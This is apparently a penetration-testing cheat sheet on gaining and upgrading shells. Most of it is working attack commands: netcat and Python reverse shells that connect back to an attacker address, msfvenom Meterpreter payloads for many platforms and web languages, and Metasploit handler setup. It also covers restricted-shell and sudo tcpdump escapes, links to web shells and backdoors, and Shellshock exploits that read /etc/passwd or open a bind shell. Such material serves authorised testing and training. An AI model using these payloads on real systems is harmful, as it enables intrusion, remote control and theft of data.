# [](#shells)Shells

*   Netcat Shell Listener

    `nc -nlvp 4444`
    
    In order to make a Windows shell more stable wrap the command with `rlwrap`
    
    `rlwrap nc -nlvp 4444`

*   Spawning a TTY Shell - Break out of Jail or limited shell You should almost always upgrade your shell after taking control of an apache or www user.

        (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )

        (hint: sudo -l to see what you can run)

    *   You may encounter limited shells that use rbash and only allow you to execute a single command per session. You can overcome this by executing an SSH shell to your localhost:

              ssh user@$ip nc $localip 4444 -e /bin/sh
              enter user's password
              python -c 'import pty; pty.spawn("/bin/sh")'
              export TERM=linux

    `python -c 'import pty; pty.spawn("/bin/sh")'`

               python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);          s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'

    `echo os.system('/bin/bash')`

    `/bin/sh -i`

    `perl —e 'exec "/bin/sh";'`

    perl: `exec "/bin/sh";`

    ruby: `exec "/bin/sh"`

    lua: `os.execute('/bin/sh')`

    From within IRB: `exec "/bin/sh"`

    From within vi: `:!bash` or

    `:set shell=/bin/bash:shell`

    From within vim `':!bash':`

    From within nmap: `!sh`

    From within tcpdump

         echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root

    From busybox `/bin/busybox telnetd -|/bin/sh -p9999`
    
*   If you've obtained a partially interactive bash shell (e.g. from a netcat listener) you can upgrade to a fully interactive shell (with tab autocomplete, and commands such as su and nano) by running the following commands:

        CTRL+Z         #send current shell to background
        stty raw -echo #tell your terminal to pass keyboard shortcuts etc.
        fg             #bring shell back to the foreground
        
*   Another way to upgrade to a fully interactive shell

    `/usr/bin/script -qc /bin/bash /dev/null`

*   Pen test monkey PHP reverse shell  
    [http://pentestmonkey.net/tools/web-shells/php-reverse-shel](http://web.archive.org/web/20171113221652/http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

*   php-findsock-shell - turns PHP port 80 into an interactive shell  
    [http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://web.archive.org/web/20171113221652/http://pentestmonkey.net/tools/web-shells/php-findsock-shell)

*   Perl Reverse Shell  
    [http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://web.archive.org/web/20171113221652/http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)

*   PHP powered web browser Shell b374k with file upload etc.  
    [https://github.com/b374k/b374k](http://web.archive.org/web/20171113221652/https://github.com/b374k/b374k)

*   Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell[https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1](http://web.archive.org/web/20171113221652/https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1)

*   Web Backdoors from Fuzzdb [https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors](http://web.archive.org/web/20171113221652/https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors)

*   Creating Meterpreter Shells with MSFVenom - [http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/](http://web.archive.org/web/20171113221652/http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/)

    _Linux_

    `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`

    _Windows_

    `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`

    _Mac_

    `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`

    **Web Payloads**

    _PHP_

    `msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`

    OR

    `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`

    Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage:

    `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`

    _ASP_

    `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`

    _JSP_

    `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`

    _WAR_

    `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`

    **Scripting Payloads**

    _Python_

    `msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`

    _Bash_

    `msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`

    _Perl_

    `msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`

    **Shellcode**

    For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

    _Linux Based Shellcode_

    `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`

    _Windows Based Shellcode_

    `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`

    _Mac Based Shellcode_

    `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`

    **Handlers** Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

         use exploit/multi/handler
         set PAYLOAD <Payload name>
         set LHOST <LHOST value>
         set LPORT <LPORT value>
         set ExitOnSession false
         exploit -j -z

    Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘

*   SSH to Meterpreter: [https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/](http://web.archive.org/web/20171113221652/https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/)

         use auxiliary/scanner/ssh/ssh_login
         use post/multi/manage/shell_to_meterpreter

*   SBD.exe

    sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32\. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only. sbd.exe (part of the Kali linux distribution: /usr/share/windows-binaries/backdoors/sbd.exe) can be uploaded to a windows box as a Netcat alternative.

*   Shellshock

    *   Testing for shell shock with NMap

    `root@kali:~/Documents# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip`

    *   git clone [https://github.com/nccgroup/shocker](http://web.archive.org/web/20171113221652/https://github.com/nccgroup/shocker)

    `./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose`

    *   Shell Shock SSH Forced Command  
        Check for forced command by enabling all debug output with ssh

              ssh -vvv  
              ssh -i noob noob@$ip '() { :;}; /bin/bash'

    *   cat file (view file contents)

              echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80

    *   Shell Shock run bind shell

             echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
